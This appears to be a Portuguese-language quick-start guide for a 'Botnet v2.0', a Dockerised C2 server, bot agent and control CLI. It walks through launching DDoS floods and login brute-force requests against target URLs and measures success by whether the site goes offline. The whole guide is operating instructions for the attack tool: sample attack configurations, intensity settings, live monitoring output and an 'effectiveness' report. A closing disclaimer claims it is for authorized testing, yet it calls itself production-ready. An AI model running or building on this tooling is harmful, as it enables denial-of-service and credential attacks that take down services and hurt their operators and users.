# 🚀 Botnet v2.0 - Guia Rápido

## Estrutura Atual

```
├── c2_server/          # Servidor C2 (Centro de Comando)
│   └── app.py          # Flask server na porta 5000
├── bot_agent/          # Agente bot que executa ataques
│   └── agent.py        # Loop assíncrono que busca tarefas
├── cli_control/        # Interface de controle
│   └── cli.py          # Menu interativo (MELHORADO!)
└── docker-compose.yml  # Orquestração dos containers
```

## Como Usar

### 1. **Iniciar a Botnet**
```bash
docker-compose up
```
Isso inicia:
- ✅ C2 Server na porta 5000
- ✅ Bot Agent aguardando ordens

### 2. **Abrir a CLI (em outro terminal)**
```bash
python cli_control/cli.py
```

### 3. **Enviar um Ataque**

Menu principal:
```
1. Iniciar Ataque DDoS (Múltiplas Requisições)
2. Monitorar Logs (Real-time)
3. Sair
```

Escolha a opção **1**.

### 4. **Configurar as Requisições**

Você será solicitado a adicionar até **5 requisições**:

**Exemplo de Requisição 1:**
```
URL: http://target.com/api/users
Método HTTP: GET
Headers customizados: {"X-Custom": "test"}
Body: (deixar em branco para GET)
```

**Exemplo de Requisição 2:**
```
URL: http://target.com/api/login
Método HTTP: POST
Headers customizados: {}
Body: {"user":"admin","pass":"test"}
```

### 5. **Definir Intensidade**
```
Intensidade: 100
```
(Significa: cada requisição será executada 100 vezes)

### 6. **Toque de Mágica ✨**

Depois que você confirma:

1. ✅ **Ataque é enviado** ao C2
2. 📊 **Monitoramento automático inicia**
   - Exibe requisições enviadas
   - Exibe sucessos e falhas
   - Atualiza em tempo real
3. 🎯 **Teste automático de acessibilidade**
   - Tenta acessar o site após ataque
4. 📈 **Relatório final**
   - Site continua acessível? **❌ Efetividade 0%**
   - Site fora do ar? **✓ Efetividade 100%**

---

## Exemplos Práticos

### Exemplo 1: Ataque GET Simples
```
Requisição 1:
- URL: http://localhost:8080/
- Método: GET
- Headers: {}
- Intensidade: 50
```

### Exemplo 2: Ataque com POST (Login Brute Force)
```
Requisição 1:
- URL: http://target.com/api/auth
- Método: POST
- Headers: {"Content-Type": "application/json"}
- Body: {"username":"admin","password":"test"}
- Intensidade: 100
```

### Exemplo 3: Ataque Combinado (5 Requisições)
```
Req 1: GET /api/users (100x)
Req 2: POST /api/login (100x)
Req 3: PUT /api/config (100x)
Req 4: GET /api/status (100x)
Req 5: POST /api/data (100x)
```
Total: **500 requisições** executadas em paralelo

---

## 📊 Monitoramento em Tempo Real

Durante o ataque, você vê:

```
==================================================
   MONITORAMENTO DE ATAQUE EM TEMPO REAL
==================================================

ID do Ataque: a1b2c3d4-e5f6-7890
Tempo decorrido: 25s

Status: running
Requisições Enviadas: 245
Requisições Bem-sucedidas: 245
Requisições Falhadas: 0
```

---

## 📈 Relatório Final

Após conclusão:

```
==================================================
   ANÁLISE DE EFETIVIDADE
==================================================

[*] Testando acessibilidade de http://target.com...

[!] STATUS: SITE AINDA ACESSÍVEL ❌
    Código HTTP: 200
    Tempo de resposta: 0.45s
    Efetividade: 0% - Ataque não teve efeito esperado

[+] STATUS: SITE INDISPONÍVEL ✓
    Erro: Timeout na requisição
    Efetividade: 100% - Ataque bem-sucedido!
```

---

## 🔧 Troubleshooting

### "Erro de conexão ao C2"
```
Verifique:
1. docker-compose up está rodando?
2. Porta 5000 está livre?
3. C2_URL em cli.py = "http://localhost:5000"
```

### "Bot não recebe tarefas"
```
Verifique:
1. Bot agent está online? (docker logs)
2. C2_URL no agent.py = "http://c2-server:5000"
3. Arquivo docker-compose.yml está correto
```

### "Requisições não são enviadas"
```
- Verifique se as URLs estão corretas
- Teste manualmente: curl http://target-url
- Verifique se o alvo está acessível
```

---

## 📚 Documentação Completa

Veja `CHANGELOG.md` para todas as mudanças técnicas da v2.0.

---

## ⚠️ Aviso Legal

Este botnet é para **testes de segurança autorizados** apenas. Não use em sistemas sem permissão explícita. O desenvolvedor não é responsável por uso indevido.

---

**Versão:** 2.0  
**Data:** 2026-09-26  
**Status:** ✅ Pronto para produção
